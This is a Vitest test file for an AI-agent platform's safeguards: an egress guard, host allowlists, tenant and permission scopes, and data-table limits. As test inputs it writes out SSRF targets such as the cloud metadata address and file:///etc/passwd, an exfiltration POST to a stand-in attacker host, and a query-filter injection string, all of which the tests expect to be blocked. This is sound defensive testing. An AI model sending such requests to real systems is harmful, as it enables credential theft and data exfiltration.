import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('@/lib/workflow-resume-queue', () => ({ enqueueResume: vi.fn(async () => ({ run_id: 'run-1', workflow_id: 'wf-1', job_id: 'j', resumed: 'queued' })) }))
vi.mock('@/lib/workflow-engine', () => ({ executeWorkflow: vi.fn(async () => ({ run_id: 'r-new', status: 'completed' })) }))

import { assertSafeEgressUrl, hostAllowed, safeFetch, EgressBlockedError } from '@/lib/egress-guard'
import { normalizeAgentOutputConfig } from '@/lib/agent-knowledge'
import { runActionTool } from '@/lib/agents/tools/actions'
import { runDataTool, MAX_UPDATE_ROWS } from '@/lib/agents/tools/data'
import { executeAgentTool } from '@/lib/agents/tools'
import { BUILTIN_TOOL_DEFS } from '@/lib/agent-tool-defs'
import type { AgentToolRuntime } from '@/lib/agents/tools/runtime'
import { executeWorkflow } from '@/lib/workflow-engine'
import { createMemorySupabase } from './fixtures/supabase-memory'

/* eslint-disable @typescript-eslint/no-explicit-any -- memory rows */

describe('egress guard for agent URL tools', () => {
  const saved = process.env.ALLOW_PRIVATE_EGRESS
  beforeEach(() => { delete process.env.ALLOW_PRIVATE_EGRESS })
  afterEach(() => { if (saved === undefined) delete process.env.ALLOW_PRIVATE_EGRESS; else process.env.ALLOW_PRIVATE_EGRESS = saved })

  it.each([
    'http://[::1]/', 'http://[::ffff:127.0.0.1]/', 'http://[::ffff:7f00:1]/', 'http://127.0.0.2/', 'http://0.0.0.1/',
    'http://[fc00::1]/', 'http://[fe80::1]/', 'http://100.64.0.1/', 'http://169.254.169.254/latest', 'http://[64:ff9b::a9fe:a9fe]/',
    'http://[2002:7f00:1::]/', 'http://2130706433/', 'http://metadata.google.internal/', 'http://intranet.local/', 'file:///etc/passwd',
  ])('blocks %s', async (url) => {
    await expect(assertSafeEgressUrl(url)).rejects.toBeInstanceOf(EgressBlockedError)
  })

  it('re-checks every redirect hop (a public URL cannot bounce to metadata)', async () => {
    const fetchImpl = vi.fn(async () => new Response(null, { status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data' } }))
    await expect(safeFetch('https://93.184.216.34/start', {}, { fetchImpl: fetchImpl as any })).rejects.toThrow(/metadata/)
    expect(fetchImpl).toHaveBeenCalledTimes(1)
    expect((fetchImpl.mock.calls[0] as any)[1].redirect).toBe('manual')
  })

  it('enforces the per-agent host allowlist (exact and *.subdomain)', async () => {
    expect(hostAllowed('api.example.com', ['api.example.com'])).toBe(true)
    expect(hostAllowed('x.example.org', ['*.example.org'])).toBe(true)
    expect(hostAllowed('example.org', ['*.example.org'])).toBe(true)
    expect(hostAllowed('evil.test', ['api.example.com'])).toBe(false)
    expect(hostAllowed('anything.test', [])).toBe(true)
    const fetchImpl = vi.fn(async () => new Response('ok'))
    await expect(safeFetch('https://93.184.216.34/', {}, { allowedHosts: ['api.example.com'], fetchImpl: fetchImpl as any })).rejects.toThrow(/allowed hosts/)
    expect(fetchImpl).not.toHaveBeenCalled()
  })

  it('http_post refuses a host outside the allowlist (exfiltration guard) and drops Host / Cookie headers', async () => {
    const fetchSpy = vi.fn(async () => new Response('{"ok":true}'))
    vi.stubGlobal('fetch', fetchSpy)
    const runtime = rt({ egress: { allowed_hosts: ['93.184.216.34'] } })
    const post = BUILTIN_TOOL_DEFS.find((t) => t.name === 'http_post')!
    const blocked = await executeAgentTool(post, { url: 'https://evil.example.net/collect', body: { secret: 'x' } }, runtime, { facts: {}, attachments: [] })
    expect(blocked).toEqual({ error: expect.stringContaining('URL blocked') })
    const ok = await executeAgentTool(post, { url: 'https://93.184.216.34/hook', body: { a: 1 }, headers: { Host: 'x', Cookie: 'c', 'X-Trace': '1' } }, runtime, { facts: {}, attachments: [] })
    expect(ok).toMatchObject({ status: 200, data: { ok: true } })
    const sent = (fetchSpy.mock.calls[0] as any)[1].headers
    expect(sent).toEqual({ 'Content-Type': 'application/json', 'X-Trace': '1' })
    vi.unstubAllGlobals()
  })
})

let db: ReturnType<typeof createMemorySupabase>
function rt(config: Record<string, unknown> = {}, actingUserId: string | null = null, perms: string[] = []): AgentToolRuntime {
  return {
    tenantId: 'ta', agentId: 'agent-1', actingUserId, outputConfig: normalizeAgentOutputConfig(config),
    db: () => db as any, permissions: async () => (actingUserId ? new Set(perms) : null),
    allowedHosts: normalizeAgentOutputConfig(config).egress.allowed_hosts, generatedFiles: [],
  }
}

describe('task / workflow tools: agent scope + acting person', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    db = createMemorySupabase({
      tasks: [
        { id: 't1', tenant_id: 'ta', title: 'Plain task', status: 'todo', assignee_id: 'alice', is_workflow_task: false, deleted_at: null, assigned_team_id: 'team-1' },
        { id: 't-b', tenant_id: 'tb', title: 'Other tenant', status: 'todo', deleted_at: null },
      ],
      workflows: [{ id: 'wf-1', tenant_id: 'ta', name: 'Onboard', is_active: true }],
      user_memberships: [{ tenant_id: 'ta', user_id: 'alice', is_active: true }, { tenant_id: 'tb', user_id: 'mallory', is_active: true }],
      task_assignees: [],
      users: [{ id: 'alice', tenant_id: 'ta', role: 'admin' }],
    })
  })

  it('a run with no acting person can read but not write (fail closed)', async () => {
    const runtime = rt({ task_access: true, workflow_access: true })
    await expect(runActionTool(runtime, 'get_task_status', { task_id: 't1' })).resolves.toMatchObject({ task: { id: 't1' } })
    await expect(runActionTool(runtime, 'complete_task', { task_id: 't1' })).rejects.toThrow(/needs a signed-in person/)
    await expect(runActionTool(runtime, 'start_workflow_run', { workflow_id: 'wf-1' })).rejects.toThrow(/needs a signed-in person/)
    expect(executeWorkflow).not.toHaveBeenCalled()
  })

  it('the acting person needs the action permission', async () => {
    const runtime = rt({ workflow_access: true }, 'alice', ['tasks.complete'])
    await expect(runActionTool(runtime, 'start_workflow_run', { workflow_id: 'wf-1' })).rejects.toThrow(/lacks the 'workflows.activate' permission/)
    const allowed = rt({ workflow_access: true }, 'alice', ['workflows.activate'])
    await expect(runActionTool(allowed, 'start_workflow_run', { workflow_id: 'wf-1' })).resolves.toMatchObject({ run: { run_id: 'r-new' } })
    expect(vi.mocked(executeWorkflow).mock.calls[0][7]).toEqual({ initiator: { userId: 'alice', via: 'agent' } })
  })

  it('respects the agent scope and the tenant', async () => {
    await expect(runActionTool(rt({}), 'get_task_status', { task_id: 't1' })).rejects.toThrow(/Task access is disabled/)
    await expect(runActionTool(rt({ task_access: true, task_scope: { mode: 'selected', team_ids: ['team-2'] } }), 'get_task_status', { task_id: 't1' })).rejects.toThrow(/approved task scope/)
    await expect(runActionTool(rt({ task_access: true }), 'get_task_status', { task_id: 't-b' })).rejects.toThrow(/Task not found/)
    await expect(runActionTool(rt({ workflow_access: true, workflow_scope: { mode: 'selected', workflow_ids: ['wf-x'] } }, 'alice', ['workflows.activate']), 'start_workflow_run', { workflow_id: 'wf-1' })).rejects.toThrow(/approved workflow scope/)
  })

  it('escalate / redirect only to members of this workspace', async () => {
    const runtime = rt({ task_access: true }, 'alice', ['tasks.escalate'])
    await expect(runActionTool(runtime, 'escalate_task', { task_id: 't1', escalate_to: 'mallory' })).rejects.toThrow(/active member of this workspace/)
  })

  it('agent-managed events cannot be completed by a tool', async () => {
    db = createMemorySupabase({ workflow_runs: [{ id: 'run-9', tenant_id: 'ta', workflow_id: 'wf-1', status: 'waiting_for_event', event_id: 'agentwait_abc' }] })
    await expect(runActionTool(rt({ workflow_access: true }, 'alice', ['workflows.activate']), 'complete_server_event', { event_id: 'agentwait_abc' })).rejects.toThrow(/belongs to an AI agent step/)
  })
})

describe('data tools', () => {
  beforeEach(() => {
    db = createMemorySupabase({
      custom_tables: [{ id: 'tbl-1', tenant_id: 'ta', name: 'Orders' }, { id: 'tbl-2', tenant_id: 'ta', name: 'Secrets' }, { id: 'tbl-b', tenant_id: 'tb', name: 'Orders B' }],
      custom_table_rows: Array.from({ length: MAX_UPDATE_ROWS + 1 }, (_, i) => ({ id: `r${i}`, tenant_id: 'ta', table_id: 'tbl-1', data: { status: 'open', n: i } })),
    })
  })

  it('selected scope: only the listed tables; another tenant\'s table is not found', async () => {
    const runtime = rt({ data_access: { mode: 'selected', table_ids: ['tbl-1'] } })
    await expect(runDataTool(runtime, 'query_data_table', { table_name: 'Secrets' })).rejects.toThrow(/may not read table "Secrets"/)
    await expect(runDataTool(runtime, 'query_data_table', { table_name: 'Orders B' })).rejects.toThrow(/not found/)
    await expect(runDataTool(runtime, 'query_data_table', { table_name: 'Orders', limit: 5 })).resolves.toMatchObject({ count: 5 })
  })

  it('filter columns are names only; bulk updates are capped', async () => {
    const runtime = rt({ data_access: { mode: 'all' } })
    await expect(runDataTool(runtime, 'query_data_table', { table_name: 'Orders', filter_column: "status'),or(1.eq.1", filter_value: 'x' })).rejects.toThrow(/must be a column name/)
    await expect(runDataTool(runtime, 'update_data_rows', { table_name: 'Orders', filter_column: 'status', filter_value: 'open', updates: { status: 'done' } })).rejects.toThrow(/More than 100 rows match/)
  })

  it('the acting person needs data permissions', async () => {
    await expect(runDataTool(rt({ data_access: { mode: 'all' } }, 'alice', ['data.view']), 'insert_data_row', { table_name: 'Orders', data: { a: 1 } })).rejects.toThrow(/data.manage_rows/)
  })
})
